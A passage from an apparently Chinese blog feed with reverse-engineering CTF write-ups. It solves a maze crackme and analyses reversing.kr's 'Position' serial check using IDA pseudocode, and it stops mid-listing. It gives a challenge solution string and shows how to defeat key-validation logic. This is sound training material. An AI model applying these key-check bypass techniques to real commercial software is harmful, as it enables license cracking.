    <link href="http://yoursite.com/2017/11/22/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E4%BE%8B%E9%A2%98/"/>
    <id>http://yoursite.com/2017/11/22/逆向工程例题/</id>
    <published>2017-11-22T13:02:11.000Z</published>
    <updated>2018-01-14T15:09:14.573Z</updated>
    
    <content type="html"><![CDATA[<h1 id="逆向分析："><a href="#逆向分析：" class="headerlink" title="逆向分析："></a>逆向分析：</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>软件逆向工程（Software Reverse Engineering）又称软件反向工程，是指从可运行的程序系统出发，运用解密、反汇编、系统分析、程序理解等多种计算机技术,对软件的结构、流程、算法、代码等进行逆向拆解和分析，推导出软件产品的源代码、设计原理、结构、算法、处理过程、运行方法及相关文档等。通常，人们把对软件进行反向分析的整个过程统称为软件逆向工程，把在这个过程中所采用的技术都统称为软件逆向工程技术。</strong><a id="more"></a></p><h1 id="例1：分道扬镳"><a href="#例1：分道扬镳" class="headerlink" title="例1：分道扬镳"></a>例1：分道扬镳</h1><p><strong>1.题目来源：<a href="http://www.shiyanbar.com/ctf/1885" target="_blank" rel="external">http://www.shiyanbar.com/ctf/1885</a></strong><br><strong>2.解题思路：</strong> </p><ul><li><p>步骤：</p><ul><li>注意这是错误的思路：</li><li><p>1）直接拖到IDA分析，f5反编译，得到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line">int main_0()</div><div class="line">&#123;</div><div class="line"> size_t v0; // eax@9</div><div class="line"> size_t v1; // eax@11</div><div class="line"> char v3; // [sp+Ch] [bp-7Ch]@1</div><div class="line"> char v4[48]; // [sp+4Ch] [bp-3Ch]@1</div><div class="line"> unsigned int v5; // [sp+7Ch] [bp-Ch]@1</div><div class="line"> unsigned int v6; // [sp+80h] [bp-8h]@1</div><div class="line"> int v7; // [sp+84h] [bp-4h]@1</div><div class="line"> memset(&amp;v3, 0xCCu, 0x7Cu);</div><div class="line"> v6 = 0;</div><div class="line"> v5 = 0;</div><div class="line"> v7 = 0 / 0;</div><div class="line"> printf(&quot;Please input your key:\n&quot;);</div><div class="line"> gets(v4);</div><div class="line"> if ( strlen(v4) &gt; 32 )</div><div class="line"> &#123;</div><div class="line">   printf(&quot;Too long!\n&quot;);</div><div class="line"> &#125;</div><div class="line"> else</div><div class="line"> &#123;</div><div class="line">   v5 = 0;</div><div class="line">   v4[strlen(v4)] = 0;</div><div class="line">   if ( strlen(v4) )</div><div class="line">   &#123;</div><div class="line">     do</div><div class="line">     &#123;</div><div class="line">       if ( !isalpha(v4[v5]) &amp;&amp; v4[v5] != 123 &amp;&amp; v4[v5] != 125 &amp;&amp; v4[v5] != 95 )</div><div class="line">       &#123;</div><div class="line">         printf(&quot;Sorry,you are wrong!\n&quot;);</div><div class="line">         exit(0);</div><div class="line">       &#125;</div><div class="line">       ++v5;</div><div class="line">       v0 = strlen(v4);</div><div class="line">     &#125;</div><div class="line">     while ( v5 &lt; v0 );</div><div class="line">   &#125;</div><div class="line">  _strlwr(v4);                                // 转化为小写</div><div class="line">   v6 = 0;</div><div class="line">  if ( strlen(v4) )</div><div class="line">  &#123;</div><div class="line">     do</div><div class="line">     &#123;</div><div class="line">       v4[v6++] += -128;</div><div class="line">       v1 = strlen(v4);</div><div class="line">     &#125;</div><div class="line">     while ( v6 &lt; v1 );</div><div class="line">   &#125;</div><div class="line">   if ( !strcmp(v4, &amp;byte_425A30) )</div><div class="line">     printf(&quot;Good!\n&quot;);</div><div class="line">   else</div><div class="line">     printf(&quot;Sorry,you are wrong!\n&quot;);</div><div class="line">   system(&quot;pause&quot;);</div><div class="line"> &#125;</div><div class="line"> system(&quot;pause&quot;);</div><div class="line"> return 0;</div><div class="line">   &#125;</div></pre></td></tr></table></figure></li><li><p>2)如图：找到比较的另一个字符串，因为要加128，但是又要保证输入为字符类型。所以：待比较值是一个负数。<br><img src="https://i.imgur.com/a7iMaJf.png" alt=""></p></li><li>3)根据伪代码逆向得到：<br><img src="https://i.imgur.com/jkrQkpb.png" alt=""></li><li>4)没想到这个是错的吧，哈哈哈~~~~<br><img src="https://i.imgur.com/iO7IxSO.png" alt=""></li><li>注意：以下是思路：</li><li>1）OD或者IDA搜索字符串，如图：<br><img src="https://i.imgur.com/LPvYhk6.png" alt=""></li><li>2) 迷宫问题，首先我们要知道四个方向对应的字符，起始位置，终点就行。根据地址迅速画出图像：<br><img src="https://i.imgur.com/baBOH8U.png" alt=""></li><li>3）根据题目我们很清楚知道#就是终点了</li><li>4）拖入IDA 看看，我们容易得到：<ul><li>1）输入字符串长度为22</li><li>2）四个方向字符为h,j,k,l<br><img src="https://i.imgur.com/U4L8AmB.png" alt=""><br><img src="https://i.imgur.com/ekzxUpJ.png" alt=""></li></ul></li><li>5)继续用IDA 分析，发现以下伪代码决定字符与方向的对应关系。<br><img src="https://i.imgur.com/wPN4hft.png" alt=""><br><img src="https://i.imgur.com/27TdHOk.png" alt=""><br><img src="https://i.imgur.com/tzt4EL5.png" alt=""><br><img src="https://i.imgur.com/ihtChjz.png" alt=""></li><li>6）如上图所示，当V14==’h’时，如果v6在v7和v9之间就会报错，我们结合迷宫是一个8X8的矩阵，可以得到，h是控制左右的，又由于–v6，我们得到h是控制向左的。同理：l是向右</li><li>7）由于k和j是v6+=8，v6-=8.我们知道k是控制向上的，j是控制向下的的！</li><li>8）现在就差迷宫的入口了，进过调试我们知道入口在迷宫第10个地址处。</li><li>9）其实只有一条路：<strong>jjjjjlllllkkkkhhhjjjl</strong></li></ul></li></ul><hr><h1 id="例2：Position"><a href="#例2：Position" class="headerlink" title="例2：Position"></a>例2：Position</h1><p><strong>1.题目来源：<a href="http://reversing.kr/download.php?n=7" target="_blank" rel="external">http://reversing.kr/download.php?n=7</a></strong><br><strong>2.解题思路：</strong></p><ul><li><p>步骤：</p><ul><li>1）利用OD打开，查看字符串.但是用IDA却不行。<br><img src="https://i.imgur.com/bsn6yvz.png" alt=""></li><li>2）在IDA搜索函数GetWindowsTextW（）出现目标函数。利用交叉引用找到调用的地方。如图<br><img src="https://i.imgur.com/llsuq7v.png" alt=""></li><li><p>3）F5反编译出现伪代码如下：</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div></pre></td><td class="code"><pre><div class="line">signed<span class="built_in"> int </span>__stdcall sub_401740(int a1)</div><div class="line">    &#123;</div><div class="line">  signed<span class="built_in"> int </span>v1; // edi@1</div><div class="line">  char *v2; // ecx@2</div><div class="line">  signed<span class="built_in"> int </span>v4; // esi@4</div><div class="line">  signed<span class="built_in"> int </span>v5; // esi@8</div><div class="line">  __int16 v6; // bx@10</div><div class="line">  unsigned __int8 v7; // al@15</div><div class="line">  unsigned __int8 v8; // ST2C_1@15</div><div class="line">  unsigned __int8 v9; // al@15</div><div class="line">  unsigned __int8 v10; // bl@15</div><div class="line">  wchar_t *v11; // eax@15</div><div class="line">  __int16 v12; // di@15</div><div class="line">  __int16 v13; // ax@15</div><div class="line">  wchar_t *v14; // eax@16</div><div class="line">  __int16 v15; // di@16</div><div class="line">  __int16 v16; // ax@16</div><div class="line">  wchar_t *v17; // eax@17</div><div class="line">  __int16 v18; // di@17</div><div class="line">  __int16 v19; // ax@17</div><div class="line">  wchar_t *v20; // eax@18</div><div class="line">  __int16 v21; // di@18</div><div class="line">  __int16 v22; // ax@18</div><div class="line">  wchar_t *v23; // eax@19</div><div class="line">  __int16 v24; // di@19</div><div class="line">  __int16 v25; // ax@19</div><div class="line">  unsigned __int8 v26; // al@20</div><div class="line">  unsigned __int8 v27; // ST2C_1@20</div><div class="line">  unsigned __int8 v28; // al@20</div><div class="line">  unsigned __int8 v29; // bl@20</div><div class="line">  wchar_t *v30; // eax@20</div><div class="line">  __int16 v31; // di@20</div><div class="line">  __int16 v32; // ax@20</div><div class="line">  wchar_t *v33; // eax@21</div><div class="line">  __int16 v34; // di@21</div><div class="line">  __int16 v35; // ax@21</div><div class="line">  wchar_t *v36; // eax@22</div><div class="line">  __int16 v37; // di@22</div><div class="line">  __int16 v38; // ax@22</div><div class="line">  wchar_t *v39; // eax@23</div><div class="line">  __int16 v40; // di@23</div><div class="line">  __int16 v41; // ax@23</div><div class="line">  wchar_t *v42; // eax@24</div><div class="line">  __int16 v43; // si@24</div><div class="line">  __int16 v44; // ax@24</div><div class="line">  unsigned __int8 v45; // [sp+10h] [bp-28h]@15</div><div class="line">  unsigned __int8 v46; // [sp+10h] [bp-28h]@20</div><div class="line">  unsigned __int8 v47; // [sp+11h] [bp-27h]@15</div><div class="line">  unsigned __int8 v48; // [sp+11h] [bp-27h]@20</div><div class="line">  unsigned __int8 v49; // [sp+13h] [bp-25h]@15</div><div class="line">  unsigned __int8 v50; // [sp+13h] [bp-25h]@20</div><div class="line">  unsigned __int8 v51; // [sp+14h] [bp-24h]@15</div><div class="line"> unsigned __int8 v52; // [sp+14h] [bp-24h]@20</div><div class="line">  unsigned __int8 v53; // [sp+19h] [bp-1Fh]@15</div><div class="line">  unsigned __int8 v54; // [sp+19h] [bp-1Fh]@20</div><div class="line">  unsigned __int8 v55; // [sp+1Ah] [bp-1Eh]@15</div><div class="line">  unsigned __int8 v56; // [sp+1Ah] [bp-1Eh]@20</div><div class="line">  unsigned __int8 v57; // [sp+1Bh] [bp-1Dh]@15</div><div class="line">  unsigned __int8 v58; // [sp+1Bh] [bp-1Dh]@20</div><div class="line">  unsigned __int8 v59; // [sp+1Ch] [bp-1Ch]@15</div><div class="line">  unsigned __int8 v60; // [sp+1Ch] [bp-1Ch]@20</div><div class="line">  <span class="built_in">int </span>v61; // [sp+20h] [bp-18h]@1</div><div class="line">  <span class="built_in">int </span>v62; // [sp+24h] [bp-14h]@1</div><div class="line">  char v63; // [sp+28h] [bp-10h]@1</div><div class="line">  <span class="built_in">int </span>v64; // [sp+34h] [bp-4h]@1</div><div class="line">  v1 = 0;</div><div class="line">  v64 = 0;</div><div class="line">  LOBYTE(v64) = 2;</div><div class="line">  CWnd::GetWindowTextW(a1 + 304, &amp;v61);</div><div class="line">  <span class="built_in">if </span>( *(_DWORD *)(v61 - 12) == 4 )</div><div class="line"> &#123;</div><div class="line">    v4 = 0;</div><div class="line">    while ( (unsigned __int16)ATL::CSimpleStringT&lt;wchar_t,1&gt;::GetAt(&amp;v61, v4) &gt;= 97u</div><div class="line">         &amp;&amp; (unsigned __int16)ATL::CSimpleStringT&lt;wchar_t,1&gt;::GetAt(&amp;v61, v4) &lt;= 122u )    //取小写字母</div><div class="line">    &#123;</div><div class="line">      ++v4;</div><div class="line">      <span class="built_in">if </span>( v4 &gt;= 4 )</div><div class="line">      &#123;</div><div class="line">LABEL_8:</div><div class="line">        v5 = 0;</div><div class="line">        while ( 1 )</div><div class="line">        &#123;</div><div class="line">         <span class="built_in"> if </span>( v1 != v5 )</div><div class="line">          &#123;</div><div class="line">            v6 = ATL::CSimpleStringT&lt;wchar_t,1&gt;::GetAt(&amp;v61, v5);</div><div class="line">           <span class="built_in"> if </span>( (unsigned __int16)ATL::CSimpleStringT&lt;wchar_t,1&gt;::GetAt(&amp;v61, v1) == v6 )</div><div class="line">             <span class="built_in"> goto </span><span class="class">LABEL_2;</span></div><div class="line">          &#125;</div><div class="line">          ++v5;</div><div class="line">         <span class="built_in"> if </span>( v5 &gt;= 4 )</div><div class="line">          &#123;</div><div class="line">            ++v1;</div><div class="line">           <span class="built_in"> if </span>( v1 &lt; 4 )</div><div class="line">             <span class="built_in"> goto </span><span class="class">LABEL_8;</span></div><div class="line">            CWnd::GetWindowTextW(a1 + 420, &amp;v62);</div><div class="line">           <span class="built_in"> if </span>( *(_DWORD *)(v62 - 12) != 11 || (unsigned __int16)ATL::CSimpleStringT&lt;wchar_t,1&gt;::GetAt(&amp;v62, 5) != 45 )</div><div class="line">             <span class="built_in"> goto </span><span class="class">LABEL_2;</span></div><div class="line">            v7 = ATL::CSimpleStringT&lt;wchar_t,1&gt;::GetAt(&amp;v61, 0);</div><div class="line">            v8 = (v7 &amp; 1) + 5;</div><div class="line">            v59 = ((v7 &gt;&gt; 4) &amp; 1) + 5;</div><div class="line">            v53 = ((v7 &gt;&gt; 1) &amp; 1) + 5;</div><div class="line">            v55 = ((v7 &gt;&gt; 2) &amp; 1) + 5;</div><div class="line">            v57 = ((v7 &gt;&gt; 3) &amp; 1) + 5;</div><div class="line">            v9 = ATL::CSimpleStringT&lt;wchar_t,1&gt;::GetAt(&amp;v61, 1);</div><div class="line">            v45 = (v9 &amp; 1) + 1;</div><div class="line">            v51 = ((v9 &gt;&gt; 4) &amp; 1) + 1;</div><div class="line">            v47 = ((v9 &gt;&gt; 1) &amp; 1) + 1;</div><div class="line">            v10 = ((v9 &gt;&gt; 2) &amp; 1) + 1;</div><div class="line">            v49 = ((v9 &gt;&gt; 3) &amp; 1) + 1;</div><div class="line">            v11 = (wchar_t *)ATL::CSimpleStringT&lt;wchar_t,1&gt;::GetBuffer(&amp;v63);</div><div class="line">            itow_s(v8 + v10, v11, 10u, 10);     // 进制转换</div><div class="line">            v12 = ATL::CSimpleStringT&lt;wchar_t,1&gt;::GetAt(&amp;v63, 0);</div><div class="line">            v13 = ATL::CSimpleStringT&lt;wchar_t,1&gt;::GetAt(&amp;v62, 0);</div><div class="line">            v2 = &amp;v63;</div><div class="line">           <span class="built_in"> if </span>( v13 == v12 )</div><div class="line">            &#123;</div><div class="line">              ATL::CSimpleStringT&lt;wchar_t,1&gt;::ReleaseBuffer(&amp;v63, -1);</div><div class="line">              v14 = (wchar_t *)ATL::CSimpleStringT&lt;wchar_t,1&gt;::GetBuffer(&amp;v63);</div><div class="line">              itow_s(v57 + v49, v14, 0xAu, 10); // 进制转化</div><div class="line">              v15 = ATL::CSimpleStringT&lt;wchar_t,1&gt;::GetAt(&amp;v62, 1);</div><div class="line">              v16 = ATL::CSimpleStringT&lt;wchar_t,1&gt;::GetAt(&amp;v63, 0);</div><div class="line">              v2 = &amp;v63;</div><div class="line">             <span class="built_in"> if </span>( v15 == v16 )</div><div class="line">              &#123;</div><div class="line">                ATL::CSimpleStringT&lt;wchar_t,1&gt;::ReleaseBuffer(&amp;v63, -1);</div><div class="line">                v17 = (wchar_t *)ATL::CSimpleStringT&lt;wchar_t,1&gt;::GetBuffer(&amp;v63);</div><div class="line">                itow_s(v53 + v51, v17, 0xAu, 10);</div><div class="line">                v18 = ATL::CSimpleStringT&lt;wchar_t,1&gt;::GetAt(&amp;v62, 2);</div><div class="line">                v19 = ATL::CSimpleStringT&lt;wchar_t,1&gt;::GetAt(&amp;v63, 0);</div><div class="line">                v2 = &amp;v63;</div><div class="line">               <span class="built_in"> if </span>( v18 == v19 )</div><div class="line">                &#123;</div><div class="line">                  ATL::CSimpleStringT&lt;wchar_t,1&gt;::ReleaseBuffer(&amp;v63, -1);</div><div class="line">                  v20 = (wchar_t *)ATL::CSimpleStringT&lt;wchar_t,1&gt;::GetBuffer(&amp;v63);</div><div class="line">                  itow_s(v55 + v45, v20, 0xAu, 10);</div><div class="line">                  v21 = ATL::CSimpleStringT&lt;wchar_t,1&gt;::GetAt(&amp;v62, 3);</div><div class="line">                  v22 = ATL::CSimpleStringT&lt;wchar_t,1&gt;::GetAt(&amp;v63, 0);</div><div class="line">                  v2 = &amp;v63;</div><div class="line">                 <span class="built_in"> if </span>( v21 == v22 )</div><div class="line">                  &#123;</div><div class="line">                    ATL::CSimpleStringT&lt;wchar_t,1&gt;::ReleaseBuffer(&amp;v63, -1);</div><div class="line">                    v23 = (wchar_t *)ATL::CSimpleStringT&lt;wchar_t,1&gt;::GetBuffer(&amp;v63);</div><div class="line">                    itow_s(v59 + v47, v23, 0xAu, 10);</div><div class="line">                    v24 = ATL::CSimpleStringT&lt;wchar_t,1&gt;::GetAt(&amp;v62, 4);</div><div class="line">                    v25 = ATL::CSimpleStringT&lt;wchar_t,1&gt;::GetAt(&amp;v63, 0);</div><div class="line">                    v2 = &amp;v63;</div><div class="line">                   <span class="built_in"> if </span>( v24 == v25 )</div><div class="line">                    &#123;</div><div class="line">                      ATL::CSimpleStringT&lt;wchar_t,1&gt;::ReleaseBuffer(&amp;v63, -1);</div><div class="line">                      v26 = ATL::CSimpleStringT&lt;wchar_t,1&gt;::GetAt(&amp;v61, 2);</div><div class="line">                      v27 = (v26 &amp; 1) + 5;</div><div class="line">                      v60 = ((v26 &gt;&gt; 4) &amp; 1) + 5;</div><div class="line">                      v54 = ((v26 &gt;&gt; 1) &amp; 1) + 5;</div><div class="line">                      v56 = ((v26 &gt;&gt; 2) &amp; 1) + 5;</div><div class="line">                      v58 = ((v26 &gt;&gt; 3) &amp; 1) + 5;</div><div class="line">                      v28 = ATL::CSimpleStringT&lt;wchar_t,1&gt;::GetAt(&amp;v61, 3);</div><div class="line">                      v46 = (v28 &amp; 1) + 1;</div><div class="line">                      v52 = ((v28 &gt;&gt; 4) &amp; 1) + 1;</div><div class="line">                      v48 = ((v28 &gt;&gt; 1) &amp; 1) + 1;</div><div class="line">                      v29 = ((v28 &gt;&gt; 2) &amp; 1) + 1;</div><div class="line">                      v50 = ((v28 &gt;&gt; 3) &amp; 1) + 1;</div><div class="line">                      v30 = (wchar_t *)ATL::CSimpleStringT&lt;wchar_t,1&gt;::GetBuffer(&amp;v63);</div><div class="line">                      itow_s(v27 + v29, v30, 0xAu, 10);</div><div class="line">                      v31 = ATL::CSimpleStringT&lt;wchar_t,1&gt;::GetAt(&amp;v62, 6);</div><div class="line">                      v32 = ATL::CSimpleStringT&lt;wchar_t,1&gt;::GetAt(&amp;v63, 0);</div><div class="line">                      v2 = &amp;v63;</div><div class="line">                     <span class="built_in"> if </span>( v31 == v32 )</div><div class="line">                      &#123;</div><div class="line">                        ATL::CSimpleStringT&lt;wchar_t,1&gt;::ReleaseBuffer(&amp;v63, -1);</div><div class="line">                        v33 = (wchar_t *)ATL::CSimpleStringT&lt;wchar_t,1&gt;::GetBuffer(&amp;v63);</div><div class="line">                        itow_s(v58 + v50, v33, 0xAu, 10);</div><div class="line">                        v34 = ATL::CSimpleStringT&lt;wchar_t,1&gt;::GetAt(&amp;v62, 7);</div><div class="line">                        v35 = ATL::CSimpleStringT&lt;wchar_t,1&gt;::GetAt(&amp;v63, 0);</div><div class="line">                        v2 = &amp;v63;</div><div class="line">                       <span class="built_in"> if </span>( v34 == v35 )</div><div class="line">                        &#123;</div><div class="line">                          ATL::CSimpleStringT&lt;wchar_t,1&gt;::ReleaseBuffer(&amp;v63, -1);</div><div class="line">                          v36 = (wchar_t *)ATL::CSimpleStringT&lt;wchar_t,1&gt;::GetBuffer(&amp;v63);</div><div class="line">                          itow_s(v54 + v52, v36, 0xAu, 10);</div><div class="line">                          v37 = ATL::CSimpleStringT&lt;wchar_t,1&gt;::GetAt(&amp;v62, 8);</div><div class="line">                          v38 = ATL::CSimpleStringT&lt;wchar_t,1&gt;::GetAt(&amp;v63, 0);</div><div class="line">                          v2 = &amp;v63;</div><div class="line">                         <span class="built_in"> if </span>( v37 == v38 )</div><div class="line">                          &#123;</div><div class="line">                            ATL::CSimpleStringT&lt;wchar_t,1&gt;::ReleaseBuffer(&amp;v63, -1);</div><div class="line">                            v39 = (wchar_t *)ATL::CSimpleStringT&lt;wchar_t,1&gt;::GetBuffer(&amp;v63);</div><div class="line">                            itow_s(v56 + v46, v39, 0xAu, 10);</div><div class="line">                            v40 = ATL::CSimpleStringT&lt;wchar_t,1&gt;::GetAt(&amp;v62, 9);</div><div class="line">                            v41 = ATL::CSimpleStringT&lt;wchar_t,1&gt;::GetAt(&amp;v63, 0);</div><div class="line">                            v2 = &amp;v63;</div><div class="line">                           <span class="built_in"> if </span>( v40 == v41 )</div><div class="line">                            &#123;</div><div class="line">                              ATL::CSimpleStringT&lt;wchar_t,1&gt;::ReleaseBuffer(&amp;v63, -1);</div><div class="line">                              v42 = (wchar_t *)ATL::CSimpleStringT&lt;wchar_t,1&gt;::GetBuffer(&amp;v63);</div><div class="line">                              itow_s(v60 + v48, v42, 0xAu, 10);</div><div class="line">                              v43 = ATL::CSimpleStringT&lt;wchar_t,1&gt;::GetAt(&amp;v62, 10);</div><div class="line">                              v44 = ATL::CSimpleStringT&lt;wchar_t,1&gt;::GetAt(&amp;v63, 0);</div><div class="line">                              v2 = &amp;v63;</div><div class="line">                             <span class="built_in"> if </span>( v43 == v44 )</div><div class="line">                              &#123;</div><div class="line">                                ATL::CSimpleStringT&lt;wchar_t,1&gt;::ReleaseBuffer(&amp;v63, -1);</div><div class="line">                                ATL::CStringT&lt;wchar_t,StrTraitMFC_DLL&lt;wchar_t,ATL::ChTraitsCRT&lt;wchar_t&gt;&gt;&gt;::~CStringT&lt;wchar_t,StrTraitMFC_DLL&lt;wchar_t,ATL::ChTraitsCRT&lt;wchar_t&gt;&gt;&gt;(&amp;v63);</div><div class="line">                                ATL::CStringT&lt;wchar_t,StrTraitMFC_DLL&lt;wchar_t,ATL::ChTraitsCRT&lt;wchar_t&gt;&gt;&gt;::~CStringT&lt;wchar_t,StrTraitMFC_DLL&lt;wchar_t,ATL::ChTraitsCRT&lt;wchar_t&gt;&gt;&gt;(&amp;v62);</div><div class="line">                                ATL::CStringT&lt;wchar_t,StrTraitMFC_DLL&lt;wchar_t,ATL::ChTraitsCRT&lt;wchar_t&gt;&gt;&gt;::~CStringT&lt;wchar_t,StrTraitMFC_DLL&lt;wchar_t,ATL::ChTraitsCRT&lt;wchar_t&gt;&gt;&gt;(&amp;v61);</div><div class="line">                               <span class="built_in"> return </span>1;</div><div class="line">                              &#125;</div><div class="line">                            &#125;</div><div class="line">                          &#125;</div><div class="line">                        &#125;</div><div class="line">                      &#125;</div><div class="line">                    &#125;</div><div class="line">                  &#125;</div><div class="line">                &#125;</div><div class="line">              &#125;</div><div class="line">            &#125;</div><div class="line">           <span class="built_in"> goto </span><span class="class">LABEL_3;</span></div><div class="line">          &#125;</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">LABEL_2:</div><div class="line">  v2 = &amp;v63;</div><div class="line">ABEL_3:</div><div class="line">ATL::CStringT&lt;wchar_t,StrTraitMFC_DLL&lt;wchar_t,ATL::ChTraitsCRT&lt;wchar_t&gt;&gt;&gt;::~CStringT&lt;wchar_t,StrTraitMFC_DLL&lt;wchar_t,ATL::ChTraitsCRT&lt;wchar_t&gt;&gt;&gt;(v2);</div><div class="line">ATL::CStringT&lt;wchar_t,StrTraitMFC_DLL&lt;wchar_t,ATL::ChTraitsCRT&lt;wchar_t&gt;&gt;&gt;::~CStringT&lt;wchar_t,StrTraitMFC_DLL&lt;wchar_t,ATL::ChTraitsCRT&lt;wchar_t&gt;&gt;&gt;(&amp;v62);</div><div class="line">ATL::CStringT&lt;wchar_t,StrTraitMFC_DLL&lt;wchar_t,ATL::ChTraitsCRT&lt;wchar_t&gt;&gt;&gt;::~CStringT&lt;wchar_t,StrTraitMFC_DLL&lt;wchar_t,ATL::ChTraitsCRT&lt;wchar_t&gt;&gt;&gt;(&amp;v61);</div><div class="line"> <span class="built_in">return </span>0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>4)我们验证我们分析函数的正确性，进去401740函数，就可以得到上面的反编译代码：如图<br><img src="https://i.imgur.com/KMORKGT.png" alt=""></p></li><li>5)算法的主干部分：<br><img src="https://i.imgur.com/td5MShj.png" alt=""><br><img src="https://i.imgur.com/BnAOjUi.png" alt=""><br><img src="https://i.imgur.com/GN4eZWu.png" alt=""><br><img src="https://i.imgur.com/qH1RAB5.png" alt=""></li><li><p>6）分析得到以下信息：</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">v7=name[<span class="number">0</span>]</div><div class="line">v8 = (v7 &amp; <span class="number">1</span>) + <span class="number">5</span></div><div class="line">v59 = ((v7 &gt;&gt; <span class="number">4</span>) &amp; <span 